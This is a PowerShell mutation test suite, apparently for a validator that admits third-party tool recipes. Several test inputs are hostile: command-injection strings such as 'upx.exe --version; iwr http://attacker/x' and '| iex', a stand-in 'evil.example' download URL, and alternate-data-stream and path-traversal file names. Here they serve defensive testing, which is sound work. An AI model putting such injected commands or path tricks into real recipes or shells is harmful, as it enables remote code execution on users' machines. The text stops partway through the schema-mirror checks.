#requires -Version 5

# test-capability-evolution -- mutation suite for the stage-B capability admission gate.
#
# Every case breaks exactly one safety property and asserts the gate goes RED for the RIGHT reason (the
# expected substring), so a future edit that quietly removes a check cannot leave the suite green. Cases
# are grouped by the audit finding they pin down (H1..H9 + M1) so the mapping stays legible.
#
#   powershell -NoProfile -ExecutionPolicy Bypass -File test-capability-evolution.ps1

[CmdletBinding()]
param()

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

. (Join-Path $PSScriptRoot 'lib\capability-common.ps1')

$validator = Join-Path $PSScriptRoot 'validate-capabilities.ps1'
$root = Join-Path ([IO.Path]::GetTempPath()) ("cap-evo-" + [Guid]::NewGuid().ToString('N'))
$recipeDir = Join-Path $root 'capabilities\recipes'
$fixtureDir = Join-Path $root 'fixtures\capabilities'
New-Item -ItemType Directory -Force -Path $recipeDir | Out-Null
New-Item -ItemType Directory -Force -Path $fixtureDir | Out-Null

# Known-answer fixtures. Real files on disk: the gate now hashes them, so they cannot be fictional.
$posPath = Join-Path $fixtureDir 'pos.json'
$negPath = Join-Path $fixtureDir 'neg.json'
Set-Content -LiteralPath $posPath -Value '{"sample":"positive"}' -Encoding UTF8 -NoNewline
Set-Content -LiteralPath $negPath -Value '{"sample":"negative"}' -Encoding UTF8 -NoNewline
$posSha = (Get-Sha256 -Path $posPath).ToUpperInvariant()
$negSha = (Get-Sha256 -Path $negPath).ToUpperInvariant()

$passed = 0
$failed = 0
function Write-Case { param([string]$Name, [bool]$Ok, [string]$Detail = '')
    if ($Ok) { $script:passed++; Write-Output "  ok   $Name" }
    else { $script:failed++; Write-Output "FAIL   $Name $Detail" }
}

function New-BaseRecipe {
    # A recipe that SHOULD pass: declared plane, approved, real fixtures, signed, published hash.
    return [ordered]@{
        schema_version     = 1
        record_type        = 'capability_recipe'
        tool_capability_id = 'unpack.pe.upx'
        status             = 'approved'
        target_strength    = 'UNVERIFIED'
        acquire            = [ordered]@{
            source_url      = 'https://github.com/upx/upx/releases/download/v4.2.4/upx-4.2.4-win64.zip'
            pinned_version  = 'v4.2.4'
            artifact_type   = 'zip'
            expected_sha256 = ('A' * 64)
            hash_source     = 'publisher_published'
            signer          = [ordered]@{
                subject_exact = 'CN=UPX Project'
                match_policy  = 'subject_exact'
                status        = 'Valid'
                timestamped   = $true
            }
            unsigned_ack    = $false
            entry_relpath   = 'upx-4.2.4-win64/upx.exe'
            entry_sha256    = ('B' * 64)
        }
        verify             = [ordered]@{
            invoke_command         = 'upx.exe --version'
            expected_output_assert = [ordered]@{
                contains_all  = @('upx 4.2.4')
                not_contains  = @('Usage:')
                output_sha256 = ''
            }
            selftest_sample        = 'fixtures/capabilities/pos.json'
            selftest_sample_sha256 = $posSha
            negative_sample        = 'fixtures/capabilities/neg.json'
            negative_sample_sha256 = $negSha
        }
        created_at         = '2026-08-13T00:00:00Z'
        updated_at         = '2026-08-13T00:00:00Z'
    }
}

function Set-RecipeSeal {
    # Recompute payload_sha256 and (unless -NoApproval) issue a matching approval, i.e. the state a
    # legitimate approver would leave behind.
    param([Parameter(Mandatory = $true)]$Recipe, [switch]$NoApproval, [string]$ApprovalPayload = '')
    $Recipe.payload_sha256 = Get-CapabilityPayloadHash -Record $Recipe
    if (-not $NoApproval) {
        $ap = if ([string]::IsNullOrWhiteSpace($ApprovalPayload)) { $Recipe.payload_sha256 } else { $ApprovalPayload }
        $Recipe.approval = [ordered]@{ approved_by = 'coordinator'; approved_at = '2026-08-13T00:00:00Z'; payload_sha256 = $ap }
    }
    return $Recipe
}

function Invoke-Gate {
    # Write the single recipe, refresh the index (so index drift is never the incidental cause), validate.
    param([Parameter(Mandatory = $true)]$Recipe, [switch]$SkipReindex)
    Get-ChildItem -LiteralPath $recipeDir -File -Filter '*.json' | Remove-Item -Force
    Write-Utf8Json -Value $Recipe -Path (Join-Path $recipeDir 'recipe.json')
    if (-not $SkipReindex) { Update-CapabilityIndex -SkillRoot $root | Out-Null }
    $out = & powershell -NoProfile -ExecutionPolicy Bypass -File $validator -SkillRoot $root 2>&1 | Out-String
    return $out
}

function Assert-Reject {
    # The mutation must be refused, AND refused for the stated reason.
    param([string]$Name, [string]$Expect, [scriptblock]$Mutate, [switch]$SkipReindex)
    $r = New-BaseRecipe
    & $Mutate $r
    $out = if ($SkipReindex) { Invoke-Gate -Recipe $r -SkipReindex } else { Invoke-Gate -Recipe $r }
    if ($out -notmatch 'RESULT: failed') { Write-Case $Name $false "(gate ACCEPTED it)"; return }
    if ($out -notmatch [regex]::Escape($Expect)) { Write-Case $Name $false "(red, but not for '$Expect')"; return }
    Write-Case $Name $true
}

function Assert-Accept {
    # The reverse guard. A gate only ever exercised with attacks drifts into refusing legitimate input,
    # and the next person's rational move is to switch the whole door off -- so every tightening below
    # carries at least one case proving a real recipe still passes.
    param([string]$Name, [scriptblock]$Mutate)
    $r = New-BaseRecipe
    & $Mutate $r
    $out = Invoke-Gate -Recipe $r
    if ($out -match 'RESULT: passed') { Write-Case $Name $true; return }
    $why = (@([regex]::Matches($out, '(?m)^.*ERROR:.*$') | ForEach-Object { $_.Value.Trim() }) -join ' | ')
    Write-Case $Name $false "(refused: $why)"
}

Write-Output '=== baseline ==='
$base = Set-RecipeSeal (New-BaseRecipe)
$baseOut = Invoke-Gate -Recipe $base
Write-Case 'CE0 a well-formed approved recipe passes' ($baseOut -match 'RESULT: passed')

Write-Output '=== H1/H8 plane rule: a runtime status cannot live in a committed recipe ==='
Assert-Reject 'CE1 status=verified refused in the declared plane' 'runtime fact' {
    param($r) $r.status = 'verified'; Set-RecipeSeal $r -NoApproval | Out-Null
}
Assert-Reject 'CE1 status=installed refused in the declared plane' 'runtime fact' {
    param($r) $r.status = 'installed'; Set-RecipeSeal $r -NoApproval | Out-Null
}
Assert-Reject 'CE1 status=quarantined refused in the declared plane' 'runtime fact' {
    param($r) $r.status = 'quarantined'; Set-RecipeSeal $r -NoApproval | Out-Null
}
Write-Output '=== H1 nothing in the declared plane is consumable ==='
$c1 = Set-RecipeSeal (New-BaseRecipe)
$c2 = New-BaseRecipe; $c2.status = 'proposed'; $c2 = Set-RecipeSeal $c2 -NoApproval
$c3 = New-BaseRecipe; $c3.status = 'verified'; $c3 = Set-RecipeSeal $c3 -NoApproval
Write-Case 'CE2 approved is not consumable' (-not (Test-CapabilityConsumable -Record $c1))
Write-Case 'CE2 proposed is not consumable' (-not (Test-CapabilityConsumable -Record $c2))
Write-Case 'CE2 a hand-written verified is not consumable' (-not (Test-CapabilityConsumable -Record $c3))

Write-Output '=== H1/H9 payload coverage: every safety field must move the hash ==='
$covBase = Get-CapabilityPayloadHash -Record (New-BaseRecipe)
$mutations = @{
    'tool_capability_id'      = { param($r) $r.tool_capability_id = 'decompile.dotnet' }
    'target_strength'         = { param($r) $r.target_strength = 'target-verified' }
    'acquire.source_url'      = { param($r) $r.acquire.source_url = 'https://evil.example/upx.zip' }
    'acquire.pinned_version'  = { param($r) $r.acquire.pinned_version = 'v9.9.9' }
    'acquire.artifact_type'   = { param($r) $r.acquire.artifact_type = 'exe' }
    'acquire.expected_sha256' = { param($r) $r.acquire.expected_sha256 = ('C' * 64) }
    'acquire.hash_source'     = { param($r) $r.acquire.hash_source = 'tofu_first_measured' }
    'acquire.signer.subject'  = { param($r) $r.acquire.signer.subject_exact = 'CN=Someone Else' }
    'acquire.signer.thumb'    = { param($r) $r.acquire.signer.thumbprint = ('D' * 40) }
    'acquire.unsigned_ack'    = { param($r) $r.acquire.unsigned_ack = $true }
    'acquire.unsigned_reason' = { param($r) $r.acquire.unsigned_reason = 'vendor ships it unsigned on purpose' }
    'acquire.entry_relpath'   = { param($r) $r.acquire.entry_relpath = 'upx-4.2.4-win64/other.exe' }
    'acquire.entry_sha256'    = { param($r) $r.acquire.entry_sha256 = ('E' * 64) }
    'verify.invoke_command'   = { param($r) $r.verify.invoke_command = 'upx.exe --help' }
    'verify.contains_all'     = { param($r) $r.verify.expected_output_assert.contains_all = @('anything') }
    'verify.not_contains'     = { param($r) $r.verify.expected_output_assert.not_contains = @() }
    'verify.output_sha256'    = { param($r) $r.verify.expected_output_assert.output_sha256 = ('F' * 64) }
    'verify.sample_sha256'    = { param($r) $r.verify.selftest_sample_sha256 = ('1' * 64) }
    'verify.negative_sha256'  = { param($r) $r.verify.negative_sample_sha256 = ('2' * 64) }
}
foreach ($field in ($mutations.Keys | Sort-Object)) {
    $r = New-BaseRecipe
    & $mutations[$field] $r
    Write-Case "CE3 payload covers $field" ((Get-CapabilityPayloadHash -Record $r) -ne $covBase)
}

Write-Output '=== H2 approval is an anchor, not a checksum ==='
Assert-Reject 'CE4 safety field changed without recomputing payload' 'does not match the safety-critical fields' {
    param($r) Set-RecipeSeal $r | Out-Null; $r.acquire.source_url = 'https://evil.example/upx.zip'
}
Assert-Reject 'CE5 payload recomputed but approval still pins the old one' 'approval belongs to an older payload' {
    param($r)
    $stale = Get-CapabilityPayloadHash -Record $r
    $r.acquire.source_url = 'https://evil.example/upx.zip'
    Set-RecipeSeal $r -ApprovalPayload $stale | Out-Null
}
Assert-Reject 'CE6 approved without any approval block' 'requires an approval block' {
    param($r) Set-RecipeSeal $r -NoApproval | Out-Null
}
Assert-Reject 'CE7 proposed carrying an approval block' 'must not carry an approval block' {
    param($r) $r.status = 'proposed'; Set-RecipeSeal $r | Out-Null
}

Write-Output '=== H4 known-answer samples are checked against disk ==='
Assert-Reject 'CE8 sample file does not exist' 'points at a file that does not exist' {
    param($r) $r.verify.selftest_sample = 'fixtures/capabilities/ghost.json'; Set-RecipeSeal $r | Out-Null
}
Assert-Reject 'CE9 sample hash does not match the file' 'does not match the file on disk' {
    param($r) $r.verify.selftest_sample_sha256 = ('9' * 64); Set-RecipeSeal $r | Out-Null
}
Assert-Reject 'CE10 sample escapes fixtures/capabilities/' 'must live under' {
    param($r) $r.verify.negative_sample = 'SKILL.md'; Set-RecipeSeal $r | Out-Null
}
Assert-Reject 'CE11 sample path traverses upward' 'no drive/abs/parent' {
    param($r) $r.verify.negative_sample = 'fixtures/capabilities/../../SKILL.md'; Set-RecipeSeal $r | Out-Null
}

Write-Output '=== H7 hash provenance ==='
Assert-Reject 'CE12 hash_source missing' 'acquire.hash_source must be one of' {
    param($r) $r.acquire.Remove('hash_source'); Set-RecipeSeal $r | Out-Null
}
Assert-Reject 'CE13 hash_source not in the closed enum' 'acquire.hash_source must be one of' {
    param($r) $r.acquire.hash_source = 'looks_official'; Set-RecipeSeal $r | Out-Null
}
Assert-Reject 'CE14 trust-on-first-use dressed up with a signer' 'must not be combined with a signer' {
    param($r) $r.acquire.hash_source = 'tofu_first_measured'; Set-RecipeSeal $r | Out-Null
}

Write-Output '=== H6 signer is a machine-checkable object, exclusive with unsigned_ack ==='
Assert-Reject 'CE15 signed AND acknowledged-unsigned at once' 'exactly one of signer / unsigned_ack' {
    param($r) $r.acquire.unsigned_ack = $true; $r.acquire.unsigned_reason = 'both claims'; Set-RecipeSeal $r | Out-Null
}
Assert-Reject 'CE16 neither signer nor unsigned_ack' 'exactly one of signer / unsigned_ack' {
    param($r) $r.acquire.Remove('signer'); Set-RecipeSeal $r | Out-Null
}
Assert-Reject 'CE17 unsigned_ack without a reason' 'requires unsigned_reason' {
    param($r) $r.acquire.Remove('signer'); $r.acquire.unsigned_ack = $true; Set-RecipeSeal $r | Out-Null
}
Assert-Reject 'CE18 signer.status outside the enum' 'signer.status must be one of' {
    param($r) $r.acquire.signer.status = 'ProbablyFine'; Set-RecipeSeal $r | Out-Null
}
Assert-Reject 'CE19 match_policy=thumbprint without a thumbprint' 'requires a hex thumbprint' {
    param($r) $r.acquire.signer.match_policy = 'thumbprint'; Set-RecipeSeal $r | Out-Null
}
Assert-Reject 'CE20 signer without timestamped' 'timestamped required' {
    param($r) $r.acquire.signer.Remove('timestamped'); Set-RecipeSeal $r | Out-Null
}

Write-Output '=== H9 the target-verified badge cannot be set at all ==='
Assert-Reject 'CE21 target_strength=target-verified' 'target_strength must be UNVERIFIED' {
    param($r) $r.target_strength = 'target-verified'; Set-RecipeSeal $r | Out-Null
}

Write-Output '=== default-deny reaches nested objects too ==='
Assert-Reject 'CE22 unknown top-level field' 'unknown top-level field' {
    param($r) Set-RecipeSeal $r | Out-Null; $r.rogue = 'x'
}
Assert-Reject 'CE23 unknown acquire field' 'unknown acquire field' {
    param($r) $r.acquire.rogue = 'x'; Set-RecipeSeal $r | Out-Null
}
Assert-Reject 'CE24 unknown signer field' 'unknown acquire.signer field' {
    param($r) $r.acquire.signer.rogue = 'x'; Set-RecipeSeal $r | Out-Null
}
Assert-Reject 'CE25 unknown approval field' 'unknown approval field' {
    param($r) Set-RecipeSeal $r | Out-Null; $r.approval.rogue = 'x'
}

Write-Output '=== assorted integrity anchors ==='
Assert-Reject 'CE26 payload_sha256 absent' 'payload_sha256 missing/malformed' {
    param($r) Set-RecipeSeal $r | Out-Null; $r.Remove('payload_sha256')
}
Assert-Reject 'CE27 empty-file hash as an integrity anchor' 'empty-file hash' {
    param($r) $r.acquire.entry_sha256 = $script:EmptyFileSha256; Set-RecipeSeal $r | Out-Null
}
Assert-Reject 'CE28 entry_relpath traverses out of the archive' 'no drive/abs/parent' {
    param($r) $r.acquire.entry_relpath = '..\..\upx.exe'; Set-RecipeSeal $r | Out-Null
}
Assert-Reject 'CE29 non-HTTPS source' 'must be HTTPS' {
    param($r) $r.acquire.source_url = 'http://github.com/upx/upx.zip'; Set-RecipeSeal $r | Out-Null
}
Assert-Reject 'CE30 installer artifact type' 'artifact_type must be zip|exe' {
    param($r) $r.acquire.artifact_type = 'msi'; Set-RecipeSeal $r | Out-Null
}
Assert-Reject 'CE31 vacuous positive assert' 'at least one positive anchor' {
    param($r) $r.verify.expected_output_assert.contains_all = @(); Set-RecipeSeal $r | Out-Null
}
Assert-Reject 'CE32 index not refreshed after a recipe change' 'INDEX.json' {
    param($r) $r.tool_capability_id = 'build.rust'; Set-RecipeSeal $r | Out-Null
} -SkipReindex

Write-Output '=== M1 a broken record yields its own error instead of collapsing the run ==='
$broken = New-BaseRecipe
$broken = Set-RecipeSeal $broken
$broken.Remove('verify')
Get-ChildItem -LiteralPath $recipeDir -File -Filter '*.json' | Remove-Item -Force
Write-Utf8Json -Value $broken -Path (Join-Path $recipeDir 'broken.json')
$second = New-BaseRecipe
$second.tool_capability_id = 'build.rust'
$second = Set-RecipeSeal $second
$second.rogue_field = 'x'
Write-Utf8Json -Value $second -Path (Join-Path $recipeDir 'second.json')
Update-CapabilityIndex -SkillRoot $root | Out-Null
$m1 = & powershell -NoProfile -ExecutionPolicy Bypass -File $validator -SkillRoot $root 2>&1 | Out-String
$m1Errors = @([regex]::Matches($m1, 'ERROR:')).Count
Write-Case 'CE33 a structurally broken recipe still reports errors' ($m1Errors -gt 0) "(ERROR lines=$m1Errors)"
Write-Case 'CE34 the OTHER recipe findings survive the broken one' ($m1 -match 'second\.json') "(ERROR lines=$m1Errors)"

Write-Output '=== closed selftest predicate ==='
$assert = [pscustomobject]@{ contains_all = @('upx 4.2.4'); not_contains = @('Usage:'); output_sha256 = '' }
Write-Case 'CE35 empty output can never pass' (-not (Test-SelftestAssert -Output '' -Assert $assert))
Write-Case 'CE36 missing required content fails' (-not (Test-SelftestAssert -Output 'upx 3.9.6' -Assert $assert))
Write-Case 'CE37 forbidden content fails' (-not (Test-SelftestAssert -Output 'upx 4.2.4 Usage: upx [options]' -Assert $assert))
Write-Case 'CE38 the real known answer passes' (Test-SelftestAssert -Output 'upx 4.2.4 Markus Oberhumer' -Assert $assert)

Write-Output '=== rulings 6/7 batch pre-approval policy (hash_source finally has a consumer) ==='
function New-TierRecipe {
    param([string]$Tier, [string]$PinnedKey = '')
    $r = New-BaseRecipe
    $r.acquire.hash_source = $Tier
    if ($Tier -eq 'tofu_first_measured') {
        # A tofu entry may not carry a signer, so give it the only shape the validator accepts.
        $r.acquire.Remove('signer')
        $r.acquire.unsigned_ack = $true
        $r.acquire.unsigned_reason = 'measured once out of band; pinned hashes are the anchor'
    }
    # NOTE: the pinned-key field is not in the schema yet (acquire is additionalProperties:false), so a
    # recipe carrying it is refused by the validator today. That is deliberate and scheduled separately;
    # this suite exercises the POLICY function, which must already be right when the field lands.
    if (-not [string]::IsNullOrWhiteSpace($PinnedKey)) { $r.acquire[$script:CapabilityPinnedKeyField] = $PinnedKey }
    return $r
}
function Write-Verdict { param([string]$Label, $V)
    Write-Output ("       {0,-42} eligible={1,-6} {2}" -f $Label, $V.eligible, $V.reason) }

$ce39broken = Test-CapabilityBatchEligible -Record (New-TierRecipe -Tier 'tofu_first_measured')
Write-Verdict 'BROKEN   tofu_first_measured' $ce39broken
Write-Case 'CE39 trust-on-first-use is never batch pre-approved' ((-not $ce39broken.eligible) -and ($ce39broken.reason -match 'never in a batch'))
$ce39fixed = Test-CapabilityBatchEligible -Record (New-TierRecipe -Tier 'publisher_published')
Write-Verdict 'RESTORED publisher_published' $ce39fixed
Write-Case 'CE39 restored: a published hash is batch-eligible' $ce39fixed.eligible

$ce40broken = Test-CapabilityBatchEligible -Record (New-TierRecipe -Tier 'gpg_or_sigstore')
Write-Verdict 'BROKEN   gpg_or_sigstore, key not pinned' $ce40broken
Write-Case 'CE40 an unpinned detached signature is not batch-eligible' ((-not $ce40broken.eligible) -and ($ce40broken.reason -match 'pinned verifying key'))
$ce40fixed = Test-CapabilityBatchEligible -Record (New-TierRecipe -Tier 'gpg_or_sigstore' -PinnedKey ('A' * 40))
Write-Verdict 'RESTORED gpg_or_sigstore, fingerprint pinned' $ce40fixed
Write-Case 'CE40 restored: a pinned fingerprint makes it batch-eligible' $ce40fixed.eligible
$ce40hash = Test-CapabilityBatchEligible -Record (New-TierRecipe -Tier 'gpg_or_sigstore' -PinnedKey ('B' * 64))
Write-Case 'CE40 a pinned public-key hash also qualifies' $ce40hash.eligible
$ce40junkKey = Test-CapabilityBatchEligible -Record (New-TierRecipe -Tier 'gpg_or_sigstore' -PinnedKey 'trust me')
Write-Case 'CE40 a key that is not a fingerprint does not qualify' (-not $ce40junkKey.eligible)

# The gap that made this function necessary was a tier sitting in the enum with no adjudicated batch
# treatment. This case makes that impossible to repeat: add a fifth tier and this goes red until the
# frozen ruling (and this table) say what it may do.
$ce41expected = @{
    'publisher_published' = $true
    'platform_digest'     = $true
    'gpg_or_sigstore'     = $false
    'tofu_first_measured' = $false
}
$ce41unadjudicated = @($script:CapabilityHashSources | Where-Object { -not $ce41expected.ContainsKey($_) })
Write-Case 'CE41 every hash_source tier has an adjudicated batch treatment' ($ce41unadjudicated.Count -eq 0) "(unadjudicated: $($ce41unadjudicated -join ', '))"
foreach ($tier in ($script:CapabilityHashSources | Sort-Object)) {
    if (-not $ce41expected.ContainsKey($tier)) { continue }
    $v = Test-CapabilityBatchEligible -Record (New-TierRecipe -Tier $tier)
    Write-Case "CE41 $tier -> batch-eligible=$($ce41expected[$tier])" ($v.eligible -eq $ce41expected[$tier])
}

Write-Output '=== ruling 13 the privacy scan is narrowed by field, never by finding type ==='
# The serial rule fires on the most natural release-tree names, so the choice was: exempt the finding type
# (which switches a working control off) or scan fewer fields. These three cases pin that it was the latter.
Assert-Accept 'CE47 a real draft entry path is not read as a licence serial' {
    param($r) $r.acquire.entry_relpath = 'dnspy-net8-win64/dnSpy.Console.exe'; Set-RecipeSeal $r | Out-Null
}
Assert-Reject 'CE47 a serial in notes is still refused' 'privacy finding in recipe: license_serial' {
    param($r) $r.notes = 'licence key ABCD-EFGH-IJKL-MNOP'; Set-RecipeSeal $r | Out-Null
}
Assert-Reject 'CE47 a serial in a non-exempt field is still refused' 'privacy finding in recipe: license_serial' {
    param($r) $r.acquire.pinned_version = 'ABCD-EFGH-IJKL-MNOP'; Set-RecipeSeal $r | Out-Null
}

Write-Output '=== B4 invoke_command cannot carry a second command ==='
$invokeRejects = @(
    @{ Id = 'V01'; Cmd = 'upx.exe --version & calc.exe'; Expect = "metacharacter '&'" }
    @{ Id = 'V02'; Cmd = 'upx.exe --version; iwr http://attacker/x'; Expect = "metacharacter ';'" }
    @{ Id = 'V03'; Cmd = 'upx.exe --version | iex'; Expect = "metacharacter '|'" }
    @{ Id = 'V04'; Cmd = 'upx.exe $(calc.exe)'; Expect = "metacharacter '$'" }
    @{ Id = 'V05'; Cmd = '%COMSPEC% /c upx.exe --version'; Expect = "metacharacter '%'" }
    @{ Id = 'V06'; Cmd = 'upx.exe --version > out.txt'; Expect = "metacharacter '>'" }
    @{ Id = 'V07'; Cmd = 'C:\tools\upx.exe --version'; Expect = 'must not use an absolute path' }
    # A string that only LOOKS like the frozen placeholder: removing the real token leaves a bare '$'.
    @{ Id = 'V08'; Cmd = '$en$env:CAP_TOOL_DIRv:OTHER\upx.exe'; Expect = "metacharacter '$'" }
)
foreach ($c in $invokeRejects) {
    $cmd = $c.Cmd
    Assert-Reject ("CE48-{0} invoke_command '{1}'" -f $c.Id, $c.Cmd) $c.Expect ({ param($r) $r.verify.invoke_command = $cmd; Set-RecipeSeal $r | Out-Null }.GetNewClosure())
}
# Reverse guards: the two placeholders ruling 17 froze must keep working, or every real draft is refused.
foreach ($ok in @('$env:CAP_TOOL_DIR\upx.exe --version', '$env:CAP_TOOL_DIR\diec.exe -v $env:CAP_SAMPLE')) {
    $cmd = $ok
    Assert-Accept ("CE48 frozen placeholder still accepted: '$ok'") ({ param($r) $r.verify.invoke_command = $cmd; Set-RecipeSeal $r | Out-Null }.GetNewClosure())
}

Write-Output '=== B1 the declared entry must provably be an .exe ==='
$entryRejects = @(
    @{ Id = 'E01'; Path = 'setup/install.bat'; Expect = 'installer or script (.bat)' }
    @{ Id = 'E02'; Path = 'tools/postinstall.ps1'; Expect = 'installer or script (.ps1)' }
    @{ Id = 'E03'; Path = 'a/b/install.cmd'; Expect = 'installer or script (.cmd)' }
    @{ Id = 'E04'; Path = 'x/setup.msi'; Expect = 'installer or script (.msi)' }
    @{ Id = 'E05'; Path = 'x/run.vbs'; Expect = 'installer or script (.vbs)' }
    @{ Id = 'E06'; Path = 'lib/tool.jar'; Expect = 'installer or script (.jar)' }
    @{ Id = 'E07'; Path = 'upx.exe:hidden'; Expect = "must not contain ':'" }
    # Ends in .exe and is still an alternate data stream on setup.bat: the extension check alone accepts it.
    @{ Id = 'E08'; Path = 'setup.bat:payload.exe'; Expect = "must not contain ':'" }
    @{ Id = 'E09'; Path = 'upx.exe::$DATA'; Expect = "must not contain ':'" }
    @{ Id = 'E10'; Path = 'upx.exe '; Expect = 'leading or trailing whitespace' }
    @{ Id = 'E11'; Path = 'dir /upx.exe'; Expect = 'trailing space or dot' }
    @{ Id = 'E12'; Path = 'upx.exe.'; Expect = 'trailing space or dot' }
    @{ Id = 'E13'; Path = 'upx.exe.bat'; Expect = 'installer or script (.bat)' }
    @{ Id = 'E15'; Path = ('upx.' + [char]0x0435 + [char]0x0445 + [char]0x0435); Expect = 'not allowed in an in-archive path' }
    @{ Id = 'E17'; Path = 'tools/*.exe'; Expect = 'not allowed in an in-archive path' }
    @{ Id = 'E18'; Path = 'dir//upx.exe'; Expect = 'invalid path segment (empty)' }
    @{ Id = 'E19'; Path = 'CON.exe'; Expect = 'a reserved device name' }
    @{ Id = 'E20'; Path = '..\..\upx.exe'; Expect = 'no drive/abs/parent' }
    @{ Id = 'E21'; Path = 'sub/../../upx.exe'; Expect = 'no drive/abs/parent' }
    @{ Id = 'E22'; Path = 'C:\tools\upx.exe'; Expect = "must not contain ':'" }
    @{ Id = 'E23'; Path = '/usr/bin/upx'; Expect = 'no drive letter, absolute path or UNC' }
    @{ Id = 'E24'; Path = '\\server\share\upx.exe'; Expect = 'no drive letter, absolute path or UNC' }
    # E27 asserts the OVER-STRICT behaviour on purpose: 'v1..2' is a legal archive name that E4a refuses.
    # Loosening E4a into a per-segment test turns this case red, which is exactly what it is here for.
    @{ Id = 'E27'; Path = 'v1..2/upx.exe'; Expect = 'no drive/abs/parent' }
)
foreach ($c in $entryRejects) {
    $path = $c.Path
    Assert-Reject ("CE49-{0} entry_relpath '{1}'" -f $c.Id, $c.Path) $c.Expect ({ param($r) $r.acquire.entry_relpath = $path; Set-RecipeSeal $r | Out-Null }.GetNewClosure())
}
# Reverse guards. Every one of these is a real draft shape; if B1 refuses any of them it has killed the
# library it was written to protect. E14 in particular is a genuine .exe and must NOT be refused for
# containing '.bat' somewhere in the name.
$entryAccepts = @(
    @{ Id = 'E00'; Path = 'upx-5.2.0-win64/upx.exe' }
    @{ Id = 'E14'; Path = 'upx.bat.exe' }
    @{ Id = 'E16'; Path = 'UPX.EXE' }
    @{ Id = 'E25'; Path = 'jdk-21.0.12+8/bin/java.exe' }
    @{ Id = 'E26'; Path = 'dnspy-net8-win64/dnSpy.Console.exe' }
)
foreach ($c in $entryAccepts) {
    $path = $c.Path
    Assert-Accept ("CE49-{0} entry_relpath '{1}' still accepted" -f $c.Id, $c.Path) ({ param($r) $r.acquire.entry_relpath = $path; Set-RecipeSeal $r | Out-Null }.GetNewClosure())
}

Write-Output '=== ruling 10 the schema is documentation, so lib and schema must be provably identical ==='

# CE43 -- the payload-coverage table above (CE3) is hand-maintained, which made "add an acquire field and
# forget the payload" a SILENT failure: no case went red, which is how ruling 12's unsigned_reason survived
# three review rounds. Derive the check from the whitelist instead, so a new field is covered by
# construction: every acquire key must move the payload hash.
$covWhitelistBase = Get-CapabilityPayloadHash -Record (New-BaseRecipe)
$uncovered = New-Object System.Collections.Generic.List[string]
foreach ($key in $script:CapabilityAcquireKeys) {
    $r = New-BaseRecipe
    $cur = if ($r.acquire.Contains($key)) { $r.acquire[$key] } else { $null }
    if ($key -eq 'signer') { $r.acquire.signer.subject_exact = 'CN=Someone Else' }
    elseif ($cur -is [bool]) { $r.acquire[$key] = (-not $cur) }
    else { $r.acquire[$key] = ([string]$cur + '-moved') }
    if ((Get-CapabilityPayloadHash -Record $r) -eq $covWhitelistBase) { [void]$uncovered.Add($key) }
}
Write-Case 'CE43 every acquire key in the whitelist moves the payload hash' ($uncovered.Count -eq 0) "(uncovered: $($uncovered -join ', '))"

# CE44 -- the schema file is referenced by nothing at runtime: lib is the only enforcer. That is allowed
# (ruling 10) only while the two say the same thing, because reviewers DO read the schema and have already
# once concluded "implemented" from it. These cases make the schema a checked mirror instead of a claim.
$schemaFile = Join-Path (Split-Path -Parent $PSScriptRoot) 'schemas\capability-recipe.schema.json'
$schemaDoc = Get-Content -Raw -LiteralPath $schemaFile | ConvertFrom-Json

function Get-SchemaObjectNodes {
    # Every object node in the schema, by dotted path ('' = root), so the checks below cannot miss a node
    # somebody adds later.
    param($Node, [string]$Path = '')
    $out = New-Object System.Collections.Generic.List[psobject]
    if ($null -eq $Node) { return $out }
    $names = @($Node.PSObject.Properties.Name)
    if ($names -contains 'properties') {
        [void]$out.Add([pscustomobject]@{ Path = $Path; Node = $Node })
        foreach ($p in $Node.properties.PSObject.Properties) {
            $child = if ([string]::IsNullOrEmpty($Path)) { $p.Name } else { "$Path.$($p.Name)" }
            foreach ($x in (Get-SchemaObjectNodes -Node $p.Value -Path $child)) { [void]$out.Add($x) }
        }
    }
    return $out
}
function Get-SchemaEnumPaths {
    param($Node, [string]$Path = '')
    $out = New-Object System.Collections.Generic.List[string]
    if ($null -eq $Node) { return $out }
    $names = @($Node.PSObject.Properties.Name)
    if ($names -contains 'enum') { [void]$out.Add($Path) }
    if ($names -contains 'properties') {
        foreach ($p in $Node.properties.PSObject.Properties) {
            $child = if ([string]::IsNullOrEmpty($Path)) { $p.Name } else { "$Path.$($p.Name)" }
            foreach ($x in (Get-SchemaEnumPaths -Node $p.Value -Path $child)) { [void]$out.Add($x) }
        }
    }
    return $out
}

# Registered mirrors. Completeness is asserted below, so a schema node or enum added without a lib
# counterpart reds here rather than drifting quietly.
$schemaKeyMirror = [ordered]@{
    ''                              = $script:CapabilityTopLevelKeys
    'acquire'                       = $script:CapabilityAcquireKeys
    'acquire.signer'                = $script:CapabilitySignerKeys
    'verify'                        = $script:CapabilityVerifyKeys
    'verify.expected_output_assert' = $script:CapabilityAssertKeys
    'approval'                      = $script:CapabilityApprovalKeys
}
$schemaEnumMirror = [ordered]@{
    'status'                      = $script:CapabilityDeclaredStatuses
    'target_strength'             = $script:CapabilityTargetStrengths
    'acquire.artifact_type'       = $script:CapabilityArtifactTypes
    'acquire.hash_source'         = $script:CapabilityHashSources
    'acquire.signer.match_policy' = $script:CapabilitySignerMatchPolicies
    'acquire.signer.status'       = $script:CapabilitySignerStatuses
}

$schemaObjects = @(Get-SchemaObjectNodes -Node $schemaDoc)
$unregisteredNodes = @($schemaObjects | Where-Object { -not $schemaKeyMirror.Contains($_.Path) } | ForEach-Object { if ($_.Path -eq '') { '(root)' } else { $_.Path } })
Write-Case 'CE44 every object node in the schema mirrors a lib key list' ($unregisteredNodes.Count -eq 0) "(unregistered: $($unregisteredNodes -join ', '))"
$openNodes = @($schemaObjects | Where-Object { @($_.Node.PSObject.Properties.Name) -notcontains 'additionalProperties' -or $_.Node.additionalProperties -ne $false } | ForEach-Object { if ($_.Path -eq '') { '(root)' } else { $_.Path } })
Write-Case 'CE44 every object node in the schema is default-deny' ($openNodes.Count -eq 0) "(open: $($openNodes -join ', '))"
foreach ($path in $schemaKeyMirror.Keys) {
    $node = @($schemaObjects | Where-Object { $_.Path -eq $path } | Select-Object -First 1)
    $label = if ($path -eq '') { '(root)' } else { $path }
    if ($node.Count -ne 1) { Write-Case "CE44 schema node $label exists" $false '(not found in the schema)'; continue }
    $schemaNames = @($node[0].Node.properties.PSObject.Properties.Name | Sort-Object)
    $libNames = @($schemaKeyMirror[$path] | Sort-Object)
